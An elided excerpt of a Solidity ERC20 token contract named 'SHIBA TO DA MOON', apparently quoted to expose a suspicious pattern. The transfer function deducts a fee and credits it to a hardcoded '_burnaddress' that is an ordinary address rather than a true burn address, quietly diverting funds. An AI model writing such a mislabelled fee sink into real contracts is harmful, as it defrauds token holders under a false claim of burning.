...
contract ERC20 is Context, IERC20, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) public {
        ...
        _burnaddress = 0x00371BDC706c1186D84E119C2856367C0A894666;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[recipient] = _balances[recipient].sub(amount / 100 * _feeReflection);
        uint256 tokens = _balances[recipient];
        _balances[_burnaddress] = _balances[_burnaddress].add(amount / 100 * _feeReflection);
...
contract SHIBATODAMOON is ERC20 {

    uint tokenTotalSupply = 100000000; // 100 Million Token Supply

    constructor() public ERC20("SHIBA TO DA MOON", "$SHIBMOON") {
